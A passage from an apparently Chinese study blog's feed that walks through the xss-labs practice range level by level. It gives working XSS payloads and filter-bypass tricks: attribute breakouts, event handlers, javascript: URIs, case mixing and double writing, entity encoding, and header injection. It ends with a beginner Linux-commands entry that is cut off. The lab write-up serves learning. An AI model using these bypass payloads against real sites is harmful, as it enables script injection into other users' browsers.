class="hljs-string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">embed</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="htmlspecialchars函数"><a href="#htmlspecialchars函数" class="headerlink" title="htmlspecialchars函数"></a>htmlspecialchars函数</h2><p>htmlspecialchars 函数是 PHP 中的一个内置函数，它用于将特定的 HTML 字符转换为 HTML 实体字符。在 HTML 中，某些字符如 &lt;, &gt;, “, ‘, 和 &amp; 具有特殊含义，分别代表HTML的标签、结束标签、字符引用和实体引用。如果想要在 HTML 中输出这些字符而不让它们被浏览器解释为 HTML 标签或字符引用，就需要使用 htmlspecialchars 函数将它们转换为相应的 HTML 实体。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">预定义的字符是<br><span class="hljs-meta">&amp; 成为 &amp;amp</span><br><span class="hljs-string">&quot; 成为 &amp;quot</span><br>&#x27; 成为 &amp;#039<br>&lt; 成为 &amp;lt<br>&gt; 成为 &amp;gt<br>可用引号类型<br>ENT_COMPAT：默认，仅编码双引号<br>ENT_QUOTES：编码双引号和单引号<br>ENT_NOQUOTES：不编码任何引号<br></code></pre></td></tr></table></figure><p>如果htmlspecialchars配置的是默认类型，只会编码双引号，所以可以使用单引号绕过。也可以使用绑定事件绕过。</p><p>详细内容：<a href="https://blog.csdn.net/hackzkaq/article/details/126344040">https://blog.csdn.net/hackzkaq/article/details/126344040</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> xss漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs</title>
      <link href="/2025/02/11/xss-labs/"/>
      <url>/2025/02/11/xss-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS靶场通关"><a href="#XSS靶场通关" class="headerlink" title="XSS靶场通关"></a>XSS靶场通关</h1><h2 id="less-1（无防范）"><a href="#less-1（无防范）" class="headerlink" title="less-1（无防范）"></a>less-1（无防范）</h2><p>没有任何防范，我们get请求发送的内容直接显示，get传参payload即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-2（闭合）"><a href="#less-2（闭合）" class="headerlink" title="less-2（闭合）"></a>less-2（闭合）</h2><p>可以看到在<code>&lt;h2&gt;</code>标签这里他将<code>&lt;</code>和<code>&gt;</code>进行了编码（即使用了htmlspecialchars()函数进行了过滤），而在输入<code>&lt;input&gt;</code>这个标签中，他是没有被编码的，但是可以看到我们的注入语句被放到了value值当中，这样浏览器是不会执行我们的注入语句的，所以我们要构造闭合</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-3（onclick-onfocus事件绕过）"><a href="#less-3（onclick-onfocus事件绕过）" class="headerlink" title="less-3（onclick onfocus事件绕过）"></a>less-3（onclick onfocus事件绕过）</h2><p>这一关可以看到input标签中输出了，但是检查发现input标签中的value属性也被htmlspecialchars()处理了，但是查看源码发现htmlspecialchars()函数是默认设置，所以单引号不会被处理。那么可以尝试闭合input标签的value属性，加上onfocus事件或者onblur事件、onclick事件来进行xss攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs )">我们使用一个onclick事件属性进行一个绕过构造payload<br>&#x27; οnclick=&#x27;alert(1)&#x27;<br><br>也可以使用onfocus事件进行绕过，构造payload<br>&#x27; οnfοcus=&#x27;alert(1)&#x27;<br><br>onblur事件（失去焦点时执行）<br>&#x27; onblur=&#x27;alert(1)&#x27;<br><br>或者这种写法<br>&#x27; onblur=&#x27;javascript:alert(1)&#x27;<br></code></pre></td></tr></table></figure><h2 id="less-4（onclick-onfocus事件绕过闭合）"><a href="#less-4（onclick-onfocus事件绕过闭合）" class="headerlink" title="less-4（onclick onfocus事件绕过闭合）"></a>less-4（onclick onfocus事件绕过闭合）</h2><p>发现单引号不能闭合input标签的value属性对应值的引号，所以再加一个双引号来闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-string">&#x27;&quot; onclick=&#x27;</span>alert(<span class="hljs-number">1</span>)&#x27;<br><span class="hljs-string">&#x27;&quot; onblur=&#x27;</span>alert(<span class="hljs-number">1</span>)&#x27;<br><br>或者这种写法<br><span class="hljs-string">&#x27;&quot; onblur=&#x27;</span>javascript:alert(<span class="hljs-number">1</span>)&#x27;<br></code></pre></td></tr></table></figure><h2 id="less-5（a-href-标签javascript伪协议绕过）"><a href="#less-5（a-href-标签javascript伪协议绕过）" class="headerlink" title="less-5（a href 标签javascript伪协议绕过）"></a>less-5（a href 标签javascript伪协议绕过）</h2><p>这一关将script和onblur等都进行了替换，中间加了个_导致失效，且由于有strtolowers（），所有的大写字母都会被转成小写无法使用大小写绕过，那么我们可以考虑直接去闭合整个input标签，自己再添加上a标签，a标签中使用javascript伪协议指定js代码执行</p><p>构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-6（大小写绕过）"><a href="#less-6（大小写绕过）" class="headerlink" title="less-6（大小写绕过）"></a>less-6（大小写绕过）</h2><p>尝试上一关的payload，发现href被处理了，中间加了_，使用大小写混合绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">HREF</span>=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span><br><br>或者<br>&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">HREF</span>=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-7（双写绕过）"><a href="#less-7（双写绕过）" class="headerlink" title="less-7（双写绕过）"></a>less-7（双写绕过）</h2><p>尝试上一关的payload发现script、href等被替换为空了，使用双写绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">HRhrefEF</span>=<span class="hljs-string">&#x27;javascscriptript:alert(1)&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-8（unicode编码绕过）"><a href="#less-8（unicode编码绕过）" class="headerlink" title="less-8（unicode编码绕过）"></a>less-8（unicode编码绕过）</h2><p>编码网站<br><a href="http://tools.gree020.cn/unicode/">http://tools.gree020.cn/unicode/</a></p><p><a href="https://tool.chinaz.com/tools/unicode.aspx">https://tool.chinaz.com/tools/unicode.aspx</a></p><p>尝试第5关的payload发现很多关键词都被加了_，比如href、script，尝试大小写绕过也不行，但是这里发现我们输入的payload被放在了其中的一个a标签的href属性中，直接尝试javascript伪协议，发现被转化成饿了html实体编码，这里使用unicode编码绕过，将<code>javascript:alert(1)</code>unicode转ascii（十进制ascii码）转成十六进制unicode编码也行</p><p>注意：只有作为属性值的时候才能进行编码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><h2 id="less-9（注释http-绕过）"><a href="#less-9（注释http-绕过）" class="headerlink" title="less-9（注释http:&#x2F;&#x2F;绕过）"></a>less-9（注释http:&#x2F;&#x2F;绕过）</h2><p>查看源码发现使用了strpos函数去查找我们的payload中含不含http:&#x2F;&#x2F;，如果不含的话不会输出我们的payload，所以我们在之前的语句后加一个**&#x2F;&#x2F;http:&#x2F;&#x2F;**注释掉http:&#x2F;&#x2F;，并且这里需要将原payload：<code>javascript:alert(1)</code>进行unicode编码，不然会被加_</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure><h2 id="less-10（隐藏的传参）"><a href="#less-10（隐藏的传参）" class="headerlink" title="less-10（隐藏的传参）"></a>less-10（隐藏的传参）</h2><p>发现上面的测试手段不太行了，但是查看页面源码发现了三个隐藏的input name分别为（t_link t_history t_sort），那么根据他们的name构造传参，谁出来了谁就能利用<code>http://192.168.32.1/xss-labs/level10.php?keyword=well%20done!&amp;t_link=aa&amp;t_history=bb&amp;t_sort=cc</code>可以看到cc输出到了某个input标签的value属性对应的值的位置，那么我们构造如下payload，让他们的type从hidden变为text，不再隐藏，并执行js代码</p><p><strong>注意：这里的type属性谁在前面，浏览器就会用谁</strong></p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br><br>或者<br><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="less-11（Referer注入）"><a href="#less-11（Referer注入）" class="headerlink" title="less-11（Referer注入）"></a>less-11（Referer注入）</h2><p>这一关和第十关有点像，也是发现几个隐藏的输入框，而且t_sort也能输出到了某个input标签的value属性对应的值的位置但是这里无法闭合，推测是被htmlspecialchars了，但是发现t_ref那个输入框的value值为referer请求头的值（且查看源码发现没有过滤），那么这里可以尝试给referer值加上xss的payload来进行测试</p><p>通过buro抓包来修改，payload用的还是第十关的payload。当第十关完成的时候，点击确定，然后抓包，可以抓到第十一关的数据包，然后将referer改为上面的payload</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="less-12（User-Agent注入）"><a href="#less-12（User-Agent注入）" class="headerlink" title="less-12（User Agent注入）"></a>less-12（User Agent注入）</h2><p>检查发现有个input标签name为t_ua，值为user agent的值，和上一题差不多抓包构造User Agent的payload</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="less-13（cookie注入）"><a href="#less-13（cookie注入）" class="headerlink" title="less-13（cookie注入）"></a>less-13（cookie注入）</h2><p>检查发现有个input标签name为t_cook，值为cookie的值，和前两题差不多抓包构造Cookie的payload</p><p>user&#x3D;<code>&#39;&quot; type=&#39;text&#39; onclick=&#39;alert(1)&#39;</code></p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="less-14（题有问题直接跳过）"><a href="#less-14（题有问题直接跳过）" class="headerlink" title="less-14（题有问题直接跳过）"></a>less-14（题有问题直接跳过）</h2><h2 id="less-15（ng-include文件包涵）"><a href="#less-15（ng-include文件包涵）" class="headerlink" title="less-15（ng-include文件包涵）"></a>less-15（ng-include文件包涵）</h2><p>先使用src传参试试，发现有输出，有个nginclude。</p><p><img src="/../image/xss-labs-1.png"></p><p>他是可以引入某个html页面那我们就把第一关的页面引入尝试一下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?s</span>rc=<span class="hljs-string">&#x27;http://192.168.32.1/xss-labs/level1.php?name=test&#x27;</span><br></code></pre></td></tr></table></figure><p>这里成功引入我们第一关的html文件</p><p>使用第一关的漏洞<code>src=&#39;http://192.168.32.1/xss-labs/level1.php?name=test?name&lt;script&gt;alert(1);&lt;/script&gt;&#39;</code>让第一关弹窗，尝试后发现不行，应该是有过滤把<code>&lt;script&gt;</code>过滤掉了（注意，这里不能包涵那些直接弹窗的东西如<code>&lt;script&gt;</code>，但是可以包涵那些标签的东西比如<code>&lt;a&gt;、&lt;input&gt;、&lt;img&gt;、&lt;p&gt;</code>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=1 οnerrο<span class="hljs-attribute">r</span>=alert(1)&gt;&#x27;<br><br>也可以用a标签<br>&lt;a <span class="hljs-attribute">href</span>=javascript:alert(1)&gt;&#x27;<br></code></pre></td></tr></table></figure><h2 id="less-16（url编码）"><a href="#less-16（url编码）" class="headerlink" title="less-16（url编码）"></a>less-16（url编码）</h2><p>使用上一关的img标签payload发现有输出但是进行了html实体编码，空格被变成了html实体编码<code>&amp;nbsp;</code>，我们将空格的编码替换成回车的编码进行尝试</p><p><a href="https://www.qianbo.com.cn/Tool/Url-Encode.html">UrlEncode - 在线URL网址编码、解码</a></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img%<span class="hljs-number">0</span>Asrc<span class="hljs-operator">=</span><span class="hljs-number">1</span>%<span class="hljs-number">0</span>Aοnerrοr<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><h2 id="less-17（embed标签）"><a href="#less-17（embed标签）" class="headerlink" title="less-17（embed标签）"></a>less-17（embed标签）</h2><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是相对于他们，embed标签打开不了文件的时候就会有块错误的取余。也可以绑定各种事件，比如尝试绑定一个onmouseover事件（鼠标移动到上面就会触发的事件）。后台看代码用了htmlspecialchars，所以直接写标签是不行的。</p><p>我们传参的内容被输出到embed标签属性上了，直接闭合然后绑定事件即可</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27; onmouseover=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&#x27;</span></span><br><span class="hljs-string"><span class="hljs-function"></span></span><br><span class="hljs-string"><span class="hljs-function">&#x27;</span> ο<span class="hljs-variable">nclick</span>=<span class="hljs-string">&#x27;alert()&#x27;</span></span><br></code></pre></td></tr></table></figure><h2 id="less-18（embed标签）"><a href="#less-18（embed标签）" class="headerlink" title="less-18（embed标签）"></a>less-18（embed标签）</h2><p>一样</p><h2 id="less-19-and-20（flash已经全面停止使用了，直接不做了）"><a href="#less-19-and-20（flash已经全面停止使用了，直接不做了）" class="headerlink" title="less-19 and 20（flash已经全面停止使用了，直接不做了）"></a>less-19 and 20（flash已经全面停止使用了，直接不做了）</h2><p>这两关涉及到flash触发的xss漏洞，现在flash技术全面停止使用了，所以不做了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> xss漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux基础命令</title>
      <link href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h1><p>Linux的目录结构是一个树型结构</p><p>windows系统可以拥有多个盘符，如C盘，D盘，E盘</p><p>Linux没有盘符这个概念，只有一个根目录&#x2F;，所有文件都在它下面</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1.png"></p><h3 id="Linux路径的描述方式"><a href="#Linux路径的描述方式" class="headerlink" title="Linux路径的描述方式"></a>Linux路径的描述方式</h3><p>在Linux中，路径之间的层级关系，使用：&#x2F;来表示</p><p>在windows系统中，路径之间的层级关系，使用：\来表示</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-2.png"></p><h2 id="FinalShell"><a href="#FinalShell" class="headerlink" title="FinalShell"></a>FinalShell</h2><p>连接前先输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> service ssh start<br></code></pre></td></tr></table></figure><h1 id="Linux命令入门"><a href="#Linux命令入门" class="headerlink" title="Linux命令入门"></a>Linux命令入门</h1><h2 id="Linux命令基础"><a href="#Linux命令基础" class="headerlink" title="Linux命令基础"></a>Linux命令基础</h2><p><strong>什么是命令、命令行</strong></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3.png"></p><p><strong>Linux命令基础格式</strong></p><p>无论是什么命令，用于什么用途，在Linux中，命令有其通用的格式：<br>command [-options] [parameter]</p><ul><li>commad：命令本身</li><li>-options：[可选，非必填]命令的一些选项，可以通过选项控制命令的行为细节</li><li>parameter：[可选，非必填]命令的参数，多数用于命令的指向目标等</li></ul><p>语法中的[]，表示可选的意思</p><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l /home/itheima, <span class="hljs-built_in">ls</span>是命令本身，-l是选项,/home/itheima是参数<br>意思是以列表形式，显示/home/itheima目录内的内容<br><br><span class="hljs-built_in">cp</span> -r test1 test2, <span class="hljs-built_in">cp</span>是命令本身，-r是选项，test1和test2是参数<br>意思是复制文件夹test1 成为 test2<br></code></pre></td></tr></table></figure><h3 id="ls命令入门（列出目录下内容）"><a href="#ls命令入门（列出目录下内容）" class="headerlink" title="ls命令入门（列出目录下内容）"></a>ls命令入门（列出目录下内容）</h3><p><strong>ls命令</strong></p><p><strong>ls命令的作用是列出目录下的内容，语法细节如下：</strong></p><p><strong><code>ls [-a -l -h] [Linux路径]</code></strong></p><p>-a -l -h是可选的选项</p><p>Linux路径是此命令可选的参数</p><p>当不适用选项和参数，直接使用ls命令本体，表示：以平铺形式，列出当前工作目录下的内容。</p><p><strong>HOME目录和工作目录</strong></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-4.png"></p><h3 id="ls命令的参数和选项"><a href="#ls命令的参数和选项" class="headerlink" title="ls命令的参数和选项"></a>ls命令的参数和选项</h3><p><strong>ls命令的参数</strong></p><p>当ls不适用参数，表示列出：当前工作目录的内容，即用户的HOME目录</p><p>当使用参数，ls命令的参数表示：指定一个Linux路径，列出指定路径的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> / 列出根目录的内容<br></code></pre></td></tr></table></figure><p><strong>ls命令的选项</strong></p><ul><li>-a选项，表示：all的意思，即列出全部文件（包含隐藏的文件&#x2F;文件夹）</li><li>-l选项，表示：以列表（竖向排列）的形式展示内容，并展示更多信息</li><li>-h选项，表示：以易于阅读的形式，列出文件大小，如K、M、G，必需搭配-l一起使用</li></ul><p><strong>ls命令选项的组合使用</strong><br>语法中的选项是可以组合使用的，比如学习的-a和-l可以组合应用</p><p>写法：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> -<span class="hljs-keyword">a</span><br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span><br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span><br></code></pre></td></tr></table></figure><p>三种写法都一样，表示同时应用-l和-a的功能</p><p><strong>ls选项和参数的组合使用</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span> /<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">lh</span><br><span class="hljs-keyword">ls</span> -lah<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> -<span class="hljs-keyword">a</span> -h<br></code></pre></td></tr></table></figure><h2 id="目录切换相关命令（cd-pwd）"><a href="#目录切换相关命令（cd-pwd）" class="headerlink" title="目录切换相关命令（cd&#x2F;pwd）"></a>目录切换相关命令（cd&#x2F;pwd）</h2><h4 id="cd（切换工作目录）"><a href="#cd（切换工作目录）" class="headerlink" title="cd（切换工作目录）"></a>cd（切换工作目录）</h4><p>当Linux终端（命令行）打开的时候，会默认以用户的HOME目录作为当前的工作目录</p><p>我们可以通过cd命令，更改当前所在的工作目录。</p><p>cd命令来自英文：Change Directory</p><p><strong>语法：<code>cd [Linux路径]</code></strong></p><ul><li>cd命令无需选项，只有参数，表示要切换到哪个目录下</li><li>cd命令直接执行，不写参数，表示回到用户的HOME目录</li></ul><h4 id="pwd（查看当前工作目录）"><a href="#pwd（查看当前工作目录）" class="headerlink" title="pwd（查看当前工作目录）"></a>pwd（查看当前工作目录）</h4><p>通过ls来验证当前的工作目录，其实是不恰当的。</p><p>我们可以通过pwd命令，来查看当前所在的工作目录。</p><p>pwd命令来自：Print Work Directory</p><p><strong>语法：<code>pwd</code></strong></p><ul><li><strong>pwd命令，无选项，无参数，直接输入pwd即可</strong></li></ul><h2 id="相对路径和绝对路径"><a href="#相对路径和绝对路径" class="headerlink" title="相对路径和绝对路径"></a>相对路径和绝对路径</h2><p>绝对路径：以根目录做起点，描述路径的方式，路径以&#x2F;开头</p><p>相对路径：以当前目录做起点，描述路径的方式，路径不需以&#x2F;开头</p><h2 id="特殊路径符"><a href="#特殊路径符" class="headerlink" title="特殊路径符"></a>特殊路径符</h2><ul><li>.表示当前目录，比如cd .&#x2F;Desktop 表示切换到当前目录下的Desktop目录内，和cd Desktop效果一致</li><li>..       表示上一级目录，比如：cd .. 即可切换到上一级目录，cd ..&#x2F;.. 切换到上二级目录</li><li>~       表示HOME目录，比如：cd ~ 即可切换到HOME目录或cd ~ &#x2F;Desktop，切换到HOME内的Desktop目录</li></ul><h2 id="创建目录命令（mkdir）"><a href="#创建目录命令（mkdir）" class="headerlink" title="创建目录命令（mkdir）"></a>创建目录命令（mkdir）</h2><p>通过mkdir命令可以创建新的目录（文件夹）</p><p>mkdir：Make Directory</p><p><strong>语法：mkdir [-p] Linux路径</strong></p><ul><li>参数必填，表示Linux路径，即要创建的文件夹的路径，相对路径或绝对路径均可</li><li>-p选项可选，表示自动创建不存在的父目录，适用于创建连续多层级的目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> itheima<br><span class="hljs-built_in">mkdir</span> /home/itheima/test<br><span class="hljs-built_in">mkdir</span> ./test2<br><span class="hljs-built_in">mkdir</span> ../test3<br><span class="hljs-built_in">mkdir</span> ~/test3<br></code></pre></td></tr></table></figure><p><strong>mkdir -p 选项</strong></p><p>如果想要一次性创建多个层级的目录</p><p>可以通过-p选项，将一整个链条都创建完成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p itcast/good/666<br></code></pre></td></tr></table></figure><h2 id="文件操作命令"><a href="#文件操作命令" class="headerlink" title="文件操作命令"></a>文件操作命令</h2><h3 id="touch（创建文件）"><a href="#touch（创建文件）" class="headerlink" title="touch（创建文件）"></a>touch（创建文件）</h3><p>可以通过touch命令创建文件</p><p><strong>语法：<code>**touch Linux路径</code></strong>**</p><ul><li>touch命令无选项，参数必填，表示要创建的文件路径，相对、绝对、特殊路径符均可以使用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> test.txt<br></code></pre></td></tr></table></figure><h3 id="cat命令（查看文件内容）"><a href="#cat命令（查看文件内容）" class="headerlink" title="cat命令（查看文件内容）"></a>cat命令（查看文件内容）</h3><p>准备好文件内容后，可以通过cat查看内容。</p><p><strong>语法：<code>cat Linux路径</code></strong></p><ul><li>cat同样没有选项，只有必填参数，参数表示：被查看的文件路径，相对、绝对、特殊路径符都可以使用</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> <span class="hljs-keyword">test</span>.txt<br></code></pre></td></tr></table></figure><h3 id="more命令（查看文件内容）"><a href="#more命令（查看文件内容）" class="headerlink" title="more命令（查看文件内容）"></a>more命令（查看文件内容）</h3><p>more命令同样可以查看文件内容，同cat不同的是：</p><ul><li>cat是直接将内容全部显示出来</li><li>more支持翻页，如果文件内容过多，可以一页页的展示</li></ul><p><strong>语法：<code>more Linux路径</code></strong></p><ul><li>同样没有选项，只有必填参数，参数表示：被查看的文件路径，相对、绝对、特殊路径符都可以使用</li></ul><p><strong>在查看的过程中，通过空格翻页</strong></p><p><strong>通过q退出查看</strong></p><h3 id="cp命令（复制文件文件夹）"><a href="#cp命令（复制文件文件夹）" class="headerlink" title="cp命令（复制文件文件夹）"></a>cp命令（复制文件文件夹）</h3><p>cp命令可以用于复制文件\文件夹，cp命令：copy</p><p><strong>语法：<code>cp [-r] 参数1 